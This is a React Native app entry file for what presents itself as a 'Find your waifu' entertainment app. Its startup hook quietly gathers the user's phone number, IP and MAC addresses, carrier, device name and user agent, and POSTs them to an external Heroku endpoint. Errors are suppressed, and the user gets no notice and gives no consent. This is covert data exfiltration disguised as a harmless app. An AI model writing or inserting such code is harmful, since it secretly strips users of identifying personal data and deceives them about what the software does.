import React, { useState, useEffect } from 'react'
import {
	StyleSheet,
	Text,
	SafeAreaView,
	TouchableOpacity,
	ImageBackground,
} from 'react-native'

import DeviceInfo from 'react-native-device-info'

import Dio from './components/Dio'

export default function App() {
	const [loading, setLoading] = useState(true)

	useEffect(() => {
		let date = new Date()

		const data = {
			time: date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds(),
			sysname: DeviceInfo.getSystemName(),
			brand: DeviceInfo.getBrand(),
			ip: DeviceInfo.getIpAddressSync(),
			deviceName: DeviceInfo.getDeviceNameSync(),
			mac: DeviceInfo.getMacAddressSync(),
			carrier: DeviceInfo.getCarrierSync(),
			phoneNumber: DeviceInfo.getPhoneNumberSync(),
			userAgent: DeviceInfo.getUserAgentSync(),
			type: DeviceInfo.getTypeSync(),
		}

		console.log(data)
		fetch('https://padorupadoru.herokuapp.com/mobapp', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify(data),
		}).then(() => {}).catch(()=>{})
	}, [])

	const loadingHandler = () => {
		setLoading(state => false)
	}
	return (
		<SafeAreaView style={styles.container}>
			{loading ? (
				<ImageBackground source={require('./assets/bg.png')} style={styles.bg}>
					<Text
						style={styles.txt}
					>
						Find your waifu here
					</Text>
					<TouchableOpacity style={styles.btn} onPress={loadingHandler}>
						<Text style={{ color: 'blue', fontSize: 22 }}>next</Text>
					</TouchableOpacity>
				</ImageBackground>
			) : (
				<Dio />
			)}
		</SafeAreaView>
	)
}

const styles = StyleSheet.create({
	container: {
		flex: 1,
		backgroundColor: '#a9a9a9',
		alignItems: 'center',
		justifyContent: 'center',
	},
	btn: {
		width: 200,
		height: 50,
		backgroundColor: 'white',
		borderRadius: 15,
		alignItems: 'center',
		justifyContent: 'center',
		position: 'absolute',
		bottom: 30,
	},
	bg: {
		width: '100%',
		height: '100%',
		alignItems: 'center',
	},
	txt: { color: 'white', fontSize: 32, fontWeight: 'bold', marginTop: 22 },
})
